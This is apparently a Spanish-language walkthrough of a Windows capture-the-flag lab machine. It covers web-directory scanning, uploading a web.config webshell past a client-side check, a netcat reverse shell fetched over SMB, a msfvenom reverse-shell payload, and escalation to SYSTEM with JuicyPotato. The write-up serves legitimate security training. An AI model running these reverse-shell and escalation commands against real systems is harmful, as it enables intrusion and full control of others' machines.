---
layout: post
title: "Ensalá Papas - The Hacker Labs - Windows"
date: 2026-07-26
img: /assets/img/windows/ensala/Pasted image 20260725200541.png
tags: [Windows, Web, ISS, JuicyPotato, reverse shell]
---

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725200541.png)

[Link Descarga](https://labs.thehackerslabs.com/machine/34)

Plataforma: The Hacker Labs

OS: Windows

# Reconocimiento

Usamos la herramienta **Auto-Recon** para automatizar esta fase y obtener información de interés.

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211518.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211555.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211622.png)

Como vimos anteriormente, los puertos **Microsoft Windows RPC**, son puertos dinámicos del sistema.

Muestra superficie de ataque se centrará en los puertos:

- 80 - HTTP
- 135 - MSRPC
- 139 - netbios-ssn
- 445 - microsoft-ds?

Primero intentamos sobre el servicio SMB con `smbclient`

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725212943.png)

Pero el servidor nos indica que a pesar de permite la autenticación anónima, ningún recurso es compartido para un usuario son privilegios. 

Ya que no pudimos obtener información sobre este servicio, saltaremos al servicio web. Para esto realizaremos un escaneo de directorios más profundo con `gobuster`

```
gobuster dir -u http://192.168.192.167/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,asp,config,txt,ashx,bak -t 40
```

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725213742.png)

este nos devuelve un resultado con status: 200, y que al acceder a él, nos encontramos con un apartado que nos permite subir archivos al sistema.

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725213810.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725220625.png)

```

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1"><title>
	Secure File Transfer
</title></head>
<body>
    <form name="form1" method="post" action="zoc.aspx" id="form1" enctype="multipart/form-data">
<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk5pNq4Q7devvyM3GxLRlaUA6M4jU=" />
</div>

<div>

	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWAgLLh9lHAu3ehcwDrtsEqldhDeyFYsnf+IDJ2dFXnGU=" />
</div>
    <div>
        <input type="file" name="FileUpload1" id="FileUpload1" />
        <input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();" id="btnUpload" />
        <br />
        <span id="Label1"></span>
    </div>
    </form>
</body>
</html>
```

Si analizamos el código fuente  del formulario web, hay un detalle critico en la línea del botón de envío:

`<input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();" id="btnUpload" />`

Existe una función JavaScript en el lado del cliente llamada `ValidateFile()` que se ejecuta justo cuando le hacemos clic a upload. Esta función es la encargada de verificar la extensión del archivo antes de enviarlo al servidor.

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223809.png)

Como dato, también encontramos un comentario sobre el código fuente.  

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223930.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223952.png)

Podemos ver que esta ruta nos lleva a un archivo inexistente llamado web.config u luego de investigar un poco en la red, encontramos información por parte de `hacktriks` que nos puede servir.

[ISS - Internet Information Service](https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725222918.png)

Entonces...

Nuevamente luego de algunas pruebas fallidas con archivos `.aspx, .php, .asp`, etc. llegamos a este repositorio de GitHub

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Y justamente encontramos la configuración para una webshell para el servicio ISS. 

Primero nos creamos el archivo web.config en nuestra máquina atacante, y pegamos el código que encontramos en `PayloadAllTheThings`, luego subimos el archivo al servidor ISS objetivo, y por último entramos a la ruta `/Subiditosdetono/web.config` y obtenemos la webshell funcional.

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225904.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225919.png)

Ya que tenemos acceso al sistema vamos a hacer unos pasos para obtener una reverse shell directamente en nuestra terminal.

1. Crearemos un recurso compartido con la herramienta `impacket-smbserver` para compartir el binario de netcat. Podemos encontrar el binario en el directorio `/usr/share/windows-resources/binaries/nc.exe` de nuestro Kali.

`cp /usr/share/windows-resources/binaries/nc.exe .`

2. Creamos el recurso compartido

` impacket-smbserver -smb2support sharedFolder .`

3. Ponemos en escucha con netcat por el puerto 443 
 
`rlwrap nc -lnvp 443`

4. Desde la webshell ejecutamos 

`\\<NUESTRA IP>\sharedFolder\nc.exe -e cmd <NUESTRA IP> 443`

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231621.png)
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231630.png)

### Explicación detallada de los pasos anteriores

Una Webshell básica puede resultar incómoda para trabajar de forma fluida. Para obtener una shell interactiva sin tener que guardar archivos sospechosos en el sistema de la víctima, se utiliza un binario a través de la red usando un recurso compartido SMB e invocarlo directamente en la memoria.

Kali linux tiene estos binarios que nos servirán para estos propósitos. 

`impacket-smbserver` es una herramienta de Python que inicia un servidor SMB ligero. Al utilizar el argumento `-smb2support`, habilitamos el soporte para los protocolos SMB2/SMB3, esto es fundamental para que sistemas como Windows más recientes puedan conectarse sin problemas (ya que SMBv1 Windows lo bloquea por seguridad), `sharedFolder` es el nombre del recurso compartido que se publicará en la red, y el punto `.` es para indicarle que se compartirá el directorio actual donde se encuentra el archivo `nc.exe` (el que copiamos en el primer paso).

En nuestro sistema utilizamos  `rlwrap`, un emulador de terminal que añade historial (con las flechas arriba y abajo) y un mejor manejo de caracteres que Netcat.

**Invocación remota desde la Web Shell**

`\\<NUESTRA_IP>\sharedFolder\nc.exe -e cmd <NUESTRA_IP> 443`

`\\192.168.192.139\sharedFolder\nc.exe` La máquina víctima accede a la ruta de red UNC del servidor SMB que creamos y carga en la memoria `nc.exe`

`-e cmd`, le indica a Netcat que redirija la interfaz de comandos de Windows (cmd.exe) a través del socket de red

`192.168.192.139 443` establece la conexión saliente hacia la IP de la máquina de auditoría en el puerto 443 donde `rlwrap nc` está esperando por la conexión.


## Explotación

Ya que estamos dentro de la máquina víctima tenemos acceso a algunos archivos de un usuario llamado `info`. La forma de verificar los privilegios de nuestro usuario es con el comando `whoami /priv`

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725234216.png)

si buscamos este privilegio encontramos esta información:
![](/secnotes/assets/img/windows/ensala/Pasted image 20260725234350.png)

Para explotar este privilegio podemos utilizar la herramienta `JuicyPotato` 

[Descargar JuicyPotato](https://github.com/ohpe/juicy-potato)

Ahora con el comando `copy`, nos copiaremos el archivo `JuicyPotato.exe` a la carpeta temporal de la víctima (debemos recordar que el archivo JuicyPotato debe estar en el directorio donde levantamos el servidor SMB con el archivo **nc.exe**. 

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725235456.png)

Por último nos crearemos una reverse shell con `nsfvenom` y la copiaremos en la carpeta temporal igual que el archivo anterior.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.192.139 LPORT=4444 -f exe -o rshell.exe`

![](/secnotes/assets/img/windows/ensala/Pasted image 20260725235844.png)

Ponemos el puerto 4444 en escucha. 

`rlwrap nc -lnvp 4444`

Para ejecutar `JuicyPotato` debemos agregarle algunos argumentos:

`-l 1234` = Define el puerto de escucha. La herramienta levanta un servidor de autenticación en este puerto interno para interceptar la conexión.

`-p rshell.exe` = Especifica el programa o script a ejecutar.

`-t *` = Define el tipo de token a crear (_CreateProcessWithToken_ o _CreateProcessAsUserW_)
	Le indica a JuicyPotato que prueba ambas funciones. para instanciar el nuevo proceso. Si una falla por restricciones de la cuenta, probará automáticamente la otra.

`-c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} ` = Especifica el **CLSID** (Class ID)
	Es el identificador único de un objeto COM/DCOM específico del sistema Windows. JuicyPotato abusa de este CLSID para forzar al servicio subyacente a realizar la autenticación hacia el puerto configurado (1234)

`JuicyPotato.exe -l 1234 -p rshell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`

### Cómo funciona?

1. **Abuso de DCOM:** JuicyPotato solicita al objeto COM (asociado al CLSID provisto) que instancie una interfaz.
2. **Redirección de Autenticación (Relay Local):** Se fuerza al servicio COM (que corre bajo la cuenta `NT AUTHORITY\SYSTEM`) a autenticarse usando NTLM contra el puerto local 1234 que la herramienta está escuchando.
3. **Suplantación del Token:** Gracias a que la cuenta web posee el derecho **SeImpersonatePrivilege**, la herramienta puede interceptar el token de `SYSTEM` que el servicio entregó durante la autenticación y asumir ese contexto de seguridad.
4. **Ejecución Privilegiada:** Usando las funciones de la API de Windows (**CreateProcessWithToken**) crea un nuevo proceso `rshell.exe`, el cual se hereda con los privilegios totales del sistema operativo.

El resultado...

![](/secnotes/assets/img/windows/ensala/Pasted image 20260726003217.png)

Una escalada de privilegios y el control total de la víctima.

![](/secnotes/assets/img/windows/ensala/Pasted image 20260726003444.png)
